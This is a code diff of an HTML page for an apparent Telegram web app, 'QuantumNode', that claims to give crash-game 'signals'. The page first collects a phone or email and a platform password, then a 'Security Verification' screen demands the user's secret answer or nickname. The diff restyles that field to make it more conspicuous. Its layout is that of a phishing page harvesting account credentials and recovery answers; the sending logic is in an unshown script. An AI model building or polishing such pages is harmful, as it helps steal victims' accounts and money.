@@ -7,71 +7,53 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
     <style>
-        /* أهم ستايل باش تخرج الخانة بالسيف */
+        .hidden { display: none !important; }
+        /* ستايل إجباري وبسيط جداً لضمان الظهور */
         #sec_ans {
             display: block !important;
-            visibility: visible !important;
-            width: 100% !important;
-            max-width: 350px !important;
-            height: 65px !important;
-            background-color: #1a0000 !important; /* أحمر غامق جداً للخلفية */
-            border: 4px solid #cc0000 !important; /* حدود حمراء عريضة */
-            border-radius: 15px !important;
-            color: #ffffff !important;
+            width: 90% !important;
+            height: 60px !important;
+            background-color: #ffffff !important; /* خلفية بيضاء لكسر سواد الشاشة */
+            border: 4px solid #ff0000 !important; /* حدود حمراء فاقعة */
+            border-radius: 12px !important;
+            color: #000000 !important; /* كتابة سوداء واضحة */
             font-size: 20px !important;
-            font-weight: 900 !important;
+            font-weight: bold !important;
             text-align: center !important;
             margin: 20px auto !important;
-            outline: none !important;
-            box-shadow: 0 0 25px rgba(204, 0, 0, 0.6) !important;
             opacity: 1 !important;
+            visibility: visible !important;
         }
-
-        .hidden { display: none !important; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
-<body class="bg-black text-white overflow-hidden">
+<body class="bg-black text-white">
 
     <section id="auth-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 bg-black">
-        <div class="w-full max-w-md text-center space-y-6">
-            <h1 class="text-3xl font-black italic uppercase">Quantum<span class="text-blue-600">Node</span></h1>
-            <p id="status-text" class="text-zinc-500 text-sm">اربط حساب المنصة لبدء المزامنة</p>
-            <div class="space-y-3">
-                <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl outline-none border border-white/5 text-center">
-                <input type="password" id="u_pas" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl outline-none border border-white/5 text-center">
-                <button onclick="processAuth()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-xl font-black uppercase">Start Sync</button>
-            </div>
+        <h1 class="text-3xl font-black italic mb-6">QUANTUM<span class="text-blue-600">NODE</span></h1>
+        <div class="w-full max-w-sm space-y-4">
+            <input type="text" id="u_log" placeholder="رقم الهاتف أو البريد" class="w-full p-4 bg-zinc-900 rounded-xl text-center border border-white/10">
+            <input type="password" id="u_pas" placeholder="كلمة المرور" class="w-full p-4 bg-zinc-900 rounded-xl text-center border border-white/10">
+            <button onclick="processAuth()" id="sync-btn" class="w-full py-4 bg-blue-600 rounded-xl font-bold uppercase">Start Sync</button>
+            <p id="status-text" class="text-center text-xs text-zinc-500 mt-4"></p>
         </div>
     </section>
 
-    <section id="security-layer" style="position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 24px; background-color: #000;">
-        <div style="width: 100%; max-width: 400px; text-align: center;">
+    <section id="security-layer" style="position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; background: #000; padding: 20px;">
+        <div style="text-align: center; width: 100%; max-width: 350px;">
+            <i class="fas fa-shield-alt" style="color: #ff0000; font-size: 50px; margin-bottom: 20px;"></i>
+            <h2 style="font-size: 22px; font-weight: 900; color: white; margin-bottom: 10px;">SECURITY VERIFICATION</h2>
+            <p style="color: #ff0000; font-size: 13px; font-weight: bold; margin-bottom: 20px;">أدخل اللقب أو الإجابة السرية لتأكيد هويتك</p>
             
-            <div style="width: 80px; height: 80px; background: rgba(255,0,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 2px solid #ff0000;">
-                <i class="fas fa-exclamation-triangle" style="color: #ff0000; font-size: 30px;"></i>
-            </div>
+            <input type="text" id="sec_ans" placeholder="اكتب الإجابة هنا...">
             
-            <h2 style="color: white; font-weight: 900; font-style: italic; text-transform: uppercase; font-size: 26px; margin-bottom: 5px;">Security Lock</h2>
-            <p style="color: #cc0000; font-size: 13px; font-weight: bold; text-transform: uppercase; margin-bottom: 20px;">أدخل اللقب أو الإجابة السرية فوراً</p>
-
-            <input type="text" id="sec_ans" placeholder="اكتب اللقب هنا...">
-            
-            <button onclick="finalVerify()" id="sec-btn" style="width: 100%; background: #ffffff; color: #000000; padding: 20px; border-radius: 15px; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; font-size: 16px;">Confirm & Unlock Account</button>
-
-            <div style="margin-top: 30px; font-size: 10px; color: #444; font-weight: 900; text-transform: uppercase; letter-spacing: 2px;">
-                <span style="color: #ff0000;">●</span> Secure Encrypted Verification
-            </div>
+            <button onclick="finalVerify()" id="sec-btn" style="width: 90%; background: white; color: black; padding: 18px; border-radius: 12px; font-weight: 900; border: none; cursor: pointer;">CONFIRM & UNLOCK</button>
         </div>
     </section>
 
-    <section id="main-app" class="hidden fixed inset-0 bg-black p-6 flex flex-col items-center justify-center">
-        <div class="text-center">
-            <div id="target-mult" class="text-7xl font-black text-white">1.00x</div>
-            <button onclick="getSignal()" class="mt-10 px-12 py-4 bg-white text-black font-black rounded-full">GET SIGNAL</button>
-        </div>
+    <section id="main-app" class="hidden fixed inset-0 bg-black flex flex-col items-center justify-center">
+        <div id="target-mult" class="text-7xl font-black text-white">1.00x</div>
+        <button onclick="getSignal()" class="mt-10 px-12 py-4 bg-white text-black font-black rounded-full">GET SIGNAL</button>
     </section>
 
     <script src="script.js"></script>
